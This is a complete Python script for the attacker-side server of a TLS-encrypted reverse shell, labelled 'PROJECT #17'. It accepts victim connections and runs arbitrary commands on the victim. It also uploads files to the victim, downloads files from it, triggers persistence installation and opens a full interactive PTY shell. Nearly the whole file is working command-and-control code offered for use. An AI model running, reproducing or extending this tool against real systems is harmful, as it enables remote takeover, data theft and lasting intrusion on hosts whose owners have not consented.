#!/usr/bin/env python3
"""
==============================================================
  PROJECT #17 — Reverse Shell Server (Attacker)
  Full Interactive TTY + File Transfer + Persistence
==============================================================

FEATURES:
- TLS encrypted communication
- Full PTY shell (bash) with tab completion
- File upload/download
- Persistence installation
- Command history

USAGE:
--------
  # Generate SSL certificate (first time)
  openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
  
  # Start server
  python3 reverse_shell_server.py --port 4443 --cert server.crt --key server.key
  
  # With custom bind port
  python3 reverse_shell_server.py --port 5555 --cert server.crt --key server.key

COMMANDS:
  help                - Show this help
  upload <file>       - Upload file to victim
  download <file>     - Download file from victim
  install             - Install persistence on victim
  uninstall           - Remove persistence
  shell               - Enter full TTY shell mode
  exit                - Disconnect client
==============================================================
"""

import socket
import ssl
import threading
import argparse
import os
import sys
import base64
from datetime import datetime

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def print_color(text, color=Colors.OKGREEN):
    print(f"{color}{text}{Colors.ENDC}")

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=4443, cert_file='server.crt', key_file='server.key'):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
        self.client_socket = None
        self.running = True
        
    def create_ssl_context(self):
        """Create SSL context for encrypted communication"""
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
        return context
    
    def start_server(self):
        """Start the listener"""
        print_color(f"\n{'='*70}", Colors.HEADER)
        print_color(f"  PROJECT #17 — Reverse Shell Server (Attacker)", Colors.BOLD)
        print_color(f"  Waiting for victim connection...", Colors.OKBLUE)
        print_color(f"{'='*70}", Colors.HEADER)
        print_color(f"  Host: {self.host}:{self.port}", Colors.DIM)
        print_color(f"  Cert: {self.cert_file}", Colors.DIM)
        print_color(f"{'='*70}\n", Colors.HEADER)
        
        # Create SSL context
        context = self.create_ssl_context()
        
        # Create socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(1)
        
        print_color(f"[*] Listening on {self.host}:{self.port}", Colors.OKBLUE)
        
        # Accept connection
        client_socket, client_addr = server_socket.accept()
        self.client_socket = context.wrap_socket(client_socket, server_side=True)
        
        print_color(f"\n[+] Connection established from {client_addr[0]}:{client_addr[1]}", Colors.OKGREEN)
        print_color(f"[+] Encryption: TLS established", Colors.OKGREEN)
        
        # Get system info
        self.send_command("uname -a")
        sysinfo = self.receive_output()
        print_color(f"\n[*] Target System Info:", Colors.WARNING)
        print_color(f"    {sysinfo}", Colors.DIM)
        
        self.interactive_shell()
    
    def send_command(self, command):
        """Send command to client"""
        try:
            self.client_socket.send(command.encode() + b'\n')
            return True
        except:
            return False
    
    def receive_output(self, timeout=10):
        """Receive output from client"""
        try:
            self.client_socket.settimeout(timeout)
            output = b''
            while True:
                chunk = self.client_socket.recv(4096)
                if not chunk:
                    break
                output += chunk
                if len(chunk) < 4096:
                    break
            self.client_socket.settimeout(None)
            return output.decode('utf-8', errors='ignore')
        except socket.timeout:
            return "[!] Command timed out"
        except:
            return "[!] Error receiving output"
    
    def upload_file(self, local_path):
        """Upload file to victim"""
        if not os.path.exists(local_path):
            print_color(f"[-] File not found: {local_path}", Colors.FAIL)
            return
        
        # Read and encode file
        with open(local_path, 'rb') as f:
            file_data = f.read()
        
        encoded_data = base64.b64encode(file_data).decode()
        filename = os.path.basename(local_path)
        
        # Send upload command
        self.send_command(f"__UPLOAD__ {filename} {len(encoded_data)}")
        
        # Send encoded data in chunks
        chunk_size = 1024
        for i in range(0, len(encoded_data), chunk_size):
            chunk = encoded_data[i:i+chunk_size]
            self.send_command(chunk)
            # Small delay to prevent flooding
            import time
            time.sleep(0.01)
        
        self.send_command("__UPLOAD_END__")
        
        # Get response
        response = self.receive_output()
        print_color(f"[+] Upload complete: {filename}", Colors.OKGREEN)
        print_color(f"    {response.strip()}", Colors.DIM)
    
    def download_file(self, remote_path):
        """Download file from victim"""
        self.send_command(f"__DOWNLOAD__ {remote_path}")
        
        # Receive file data
        response = self.receive_output(timeout=30)
        
        if response.startswith("__FILE_DATA__"):
            parts = response.split('\n', 2)
            if len(parts) >= 3:
                filename = parts[0].split()[1]
                encoded_data = parts[2]
                
                # Decode and save
                file_data = base64.b64decode(encoded_data)
                local_filename = os.path.basename(filename)
                
                with open(f"downloaded_{local_filename}", 'wb') as f:
                    f.write(file_data)
                
                print_color(f"[+] Downloaded: {filename} -> downloaded_{local_filename}", Colors.OKGREEN)
                print_color(f"    Size: {len(file_data)} bytes", Colors.DIM)
        else:
            print_color(f"[-] Download failed: {response}", Colors.FAIL)
    
    def install_persistence(self):
        """Install persistence on victim"""
        print_color(f"\n[*] Installing persistence on victim...", Colors.WARNING)
        self.send_command("__PERSIST_INSTALL__")
        response = self.receive_output()
        print_color(f"    {response}", Colors.DIM)
    
    def uninstall_persistence(self):
        """Remove persistence from victim"""
        print_color(f"\n[*] Removing persistence from victim...", Colors.WARNING)
        self.send_command("__PERSIST_REMOVE__")
        response = self.receive_output()
        print_color(f"    {response}", Colors.DIM)
    
    def upgrade_to_pty(self):
        """Upgrade to full PTY shell"""
        print_color(f"\n[*] Upgrading to full TTY shell...", Colors.OKBLUE)
        print_color(f"[!] Press Ctrl+D or type 'exit' to return to command mode", Colors.WARNING)
        print_color(f"[!] Tab completion, colors, and Ctrl+C now work!\n", Colors.DIM)
        
        # Send PTY upgrade command
        self.send_command("__PTY_UPGRADE__")
        
        # Enter raw mode for PTY
        import tty
        import termios
        
        old_settings = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            
            while True:
                char = sys.stdin.read(1)
                if not char:
                    break
                self.client_socket.send(char.encode())
                if char == '\x04':  # Ctrl+D
                    break
        except:
            pass
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        
        print_color(f"\n[*] Returned to command mode", Colors.OKBLUE)
    
    def show_help(self):
        """Display help menu"""
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.ENDC}
{Colors.OKGREEN}  help{Colors.ENDC}                    - Show this help
{Colors.OKGREEN}  shell{Colors.ENDC}                  - Enter full TTY shell mode
{Colors.OKGREEN}  upload <file>{Colors.ENDC}          - Upload file to victim
{Colors.OKGREEN}  download <file>{Colors.ENDC}        - Download file from victim
{Colors.OKGREEN}  install{Colors.ENDC}                - Install persistence on victim
{Colors.OKGREEN}  uninstall{Colors.ENDC}              - Remove persistence
{Colors.OKGREEN}  exit{Colors.ENDC}                   - Disconnect client

{Colors.DIM}Any other command will be executed on the victim{Colors.ENDC}
"""
        print(help_text)
    
    def interactive_shell(self):
        """Interactive command shell"""
        print_color(f"\n[*] Interactive shell ready!", Colors.OKGREEN)
        print_color(f"[*] Type 'help' for commands", Colors.DIM)
        print_color(f"[*] Type 'shell' for full TTY mode\n", Colors.DIM)
        
        while self.running:
            try:
                # Get user input
                cmd = input(f"{Colors.BOLD}shell>{Colors.ENDC} ").strip()
                
                if not cmd:
                    continue
                
                # Handle local commands
                if cmd == 'exit':
                    print_color(f"[*] Disconnecting...", Colors.WARNING)
                    self.send_command("exit")
                    self.running = False
                    break
                
                elif cmd == 'help':
                    self.show_help()
                    continue
                
                elif cmd == 'shell':
                    self.upgrade_to_pty()
                    continue
                
                elif cmd.startswith('upload '):
                    filename = cmd[7:].strip()
                    self.upload_file(filename)
                    continue
                
                elif cmd.startswith('download '):
                    filename = cmd[9:].strip()
                    self.download_file(filename)
                    continue
                
                elif cmd == 'install':
                    self.install_persistence()
                    continue
                
                elif cmd == 'uninstall':
                    self.uninstall_persistence()
                    continue
                
                # Send command to victim
                if self.send_command(cmd):
                    output = self.receive_output()
                    if output:
                        print(output)
                    else:
                        print_color("[*] Command executed (no output)", Colors.DIM)
                else:
                    print_color("[-] Connection lost!", Colors.FAIL)
                    break
                    
            except KeyboardInterrupt:
                print_color(f"\n[*] Use 'exit' to disconnect", Colors.WARNING)
                continue
            except EOFError:
                break
            except Exception as e:
                print_color(f"[-] Error: {e}", Colors.FAIL)
                break
        
        # Cleanup
        if self.client_socket:
            self.client_socket.close()
        print_color(f"\n[*] Server shut down", Colors.WARNING)

def generate_cert():
    """Generate self-signed certificate if not exists"""
    if not os.path.exists('server.crt') or not os.path.exists('server.key'):
        print_color(f"\n[*] Generating SSL certificate...", Colors.OKBLUE)
        os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')
        print_color(f"[+] Certificate generated", Colors.OKGREEN)

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Server")
    parser.add_argument("--port", type=int, default=4443, help="Port to listen on")
    parser.add_argument("--cert", default="server.crt", help="SSL certificate file")
    parser.add_argument("--key", default="server.key", help="SSL key file")
    
    args = parser.parse_args()
    
    # Generate certificate if needed
    generate_cert()
    
    # Start server
    server = ReverseShellServer(port=args.port, cert_file=args.cert, key_file=args.key)
    
    try:
        server.start_server()
    except KeyboardInterrupt:
        print_color(f"\n[*] Server stopped", Colors.WARNING)
    except Exception as e:
        print_color(f"[-] Error: {e}", Colors.FAIL)

if __name__ == "__main__":
    main()